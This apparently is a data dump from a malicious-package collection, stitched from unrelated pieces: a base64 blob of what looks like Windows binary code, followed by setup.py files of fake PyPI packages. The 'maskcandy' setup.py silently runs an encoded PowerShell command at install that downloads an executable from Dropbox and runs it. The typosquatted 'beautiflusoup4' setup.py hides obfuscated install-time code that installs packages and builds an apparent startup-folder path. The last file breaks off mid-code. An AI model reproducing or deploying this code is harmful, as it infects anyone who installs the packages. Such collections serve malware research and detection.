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"
+9bee5671fa66c348d775d9490f0d5eea5786b3a3,maskcandy-1.61,maskcandy-1.61/maskcandy-1.61/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,ba9ded81268b1dc2712ce845c96e3d549b2bbced,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'maskcandy',
+    packages = ['modlib'],
+    version = '1.75',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+b8bfa0eebdd7bf7f4da3b88a93bbf1ca9788c1f2,beautiflusoup4-0.1,beautiflusoup4-0.1/beautiflusoup4-0.1/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,78cc3b2e2ccd9d53b0296fb78009a4746de7ba47,"import sys
+from distutils.core import setup
+import random
+
+
+if sys.platform == ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)])):
+	if sys.argv[1] in [''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) + 1) << 2) + 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) - 1, (3 << 5) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) - 1])), ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(3 << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:	
+		馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61
+
+		while 馬女水女口目人馬鳥月水馬山山馬鸟:
+			if 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:
+				import pip
+				pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,
+				         oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])
+
+				馬女水女口目人馬鳥月水馬山山馬鸟 = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523
+			elif 馬女水女口目人馬鳥月水馬山山馬鸟 == 286625773:
+				try:
+					import win32com
+				except ModuleNotFoundError:
+					刀马馬馬目鳥鸟女山月馬日木鳥口女= 1
+					馬目子目刀人刀月山月女木鳥水马口 = 1
+					口马口马月人马女鸟月刀馬目马水木 = 1
+
+					for 馬水口刀女目日木馬水日月木子刀木 in range(1 << 5):
+						刀马馬馬目鳥鸟女山月馬日木鳥口女 += sum([馬目子目刀人刀月山月女木鳥水马口 << 10 ^
+						                        78 | 1 for _015896 in range(1 << 4)])
+						馬目子目刀人刀月山月女木鳥水马口 = 刀马馬馬目鳥鸟女山月馬日木鳥口女 | 馬目子目刀人刀月山月女木鳥水马口 | 口马口马月人马女鸟月刀馬目马水木
+						口马口马月人马女鸟月刀馬目马水木 = 刀马馬馬目鳥鸟女山月馬日木鳥口女 ^ 馬目子目刀人刀月山月女木鳥水马口 ^ 口马口马月人马女鸟月刀馬目马水木
+
+					馬女水女口目人馬鳥月水馬山山馬鸟 = 口马口马月人马女鸟月刀馬目马水木
+					continue
+
+				馬女水女口目人馬鳥月水馬山山馬鸟 = 200*(67 & 938)+964//905-(77 | 299+988) | 77 << 410 << 580 >> (987 | 503) & ~158
+	elif sys.argv[1] in [''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(3 << 5) + (1 << 1), (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) - 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)]))]:
+		子水女馬人月刀人馬鳥山馬馬刀女人 = 330*(311 & 395)+741//589-(771 | 842+339) | 771 << 369 << 218 >> (797 | 341) & ~526
+
+		while 子水女馬人月刀人馬鳥山馬馬刀女人:
+			if 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:
+				人馬口刀女子月水人目水鳥山口馬馬.close()
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:
+				目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (981 | 570) & ~397
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 362814:
+				鸟口目水子口山日口日日鸟马月鸟水.append(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((1 << 4) + 1) << 2) - 1, (7 << 3) + (1 << 1), (((3 << 3) - 1) << 2), (5 << 4), (7 << 4) + (1 << 1), (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, (7 << 4) + (1 << 1), (3 << 5) + 1, (((7 << 2) - 1) << 2) + 1, (((1 << 4) + 1) << 2), (3 << 5) + 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (
+				    1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), ((((3 << 2) - 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 1, (7 << 4) + 3, (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) - 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (7 << 4) + (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((5 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((1 << 4) - 1) << 3) - 3])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 102*(468 & 715)+338//836-(544 | 548+999) | 544 << 951 << 41 >> (993 | 645) & ~762
